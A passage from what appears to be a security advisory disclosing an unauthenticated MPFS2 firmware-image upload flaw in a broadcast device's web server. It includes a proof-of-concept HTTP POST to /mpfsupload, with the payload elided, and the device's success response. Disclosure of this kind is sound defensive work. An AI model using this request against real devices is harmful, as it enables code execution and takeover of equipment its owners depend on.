They have innovative functions and features that can eliminate\nthe costs required by additional equipment: automatic exchange of audio\nsources, built-in stereo encoder, integrated RDS encoder, parallel I/O\ncard, connectivity through GSM telemetry and/or TCP IP / SNMP / SMTP\nWebserver.\n\nDesc: The device allows access to an unprotected endpoint that allows\nMPFS File System binary image upload without authentication. The MPFS2\nfile system module provides a light-weight read-only file system that\ncan be stored in external EEPROM, external serial Flash, or internal\nFlash program memory. This file system serves as the basis for the\nHTTP2 web server module, but is also used by the SNMP module and is\navailable to other applications that require basic read-only storage\ncapabilities. This can be exploited to overwrite the flash program\nmemory that holds the web server's main interfaces and execute arbitrary\ncode.\n\nTested on: Webserver\n\n\nVulnerability discovered by Gjoko 'LiquidWorm' Krstic\n                            @zeroscience\n\n\nAdvisory ID: ZSL-2023-5799\nAdvisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5799.php\n\n\n18.08.2023\n\n--\n\n\nPOST /mpfsupload HTTP/1.1\nHost: 192.168.1.2:8000\nContent-Length: 251\nCache-Control: max-age=0\nContent-Type: multipart/form-data; boundary=----joxypoxy2\nUser-Agent: MPFS2_PoC/2.0c\nAccept: */*\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n------joxypoxy2\nContent-Disposition: form-data; name=\"i\"; filename=\"MPFSimg2.bin\"\nContent-Type: application/octet-stream\n\nMPFS...<CGI BINARY PHONE HOME>\n-----joxypoxy2--\n\n\nHTTP/1.1 200 OK\nConnection: close\nContent-Type: text/html\n\n<html><body style=\"margin:100px\"><b>MPFS Update Successful</b><p><a href=\"/\">Site main page</a></body></html>\n            "}
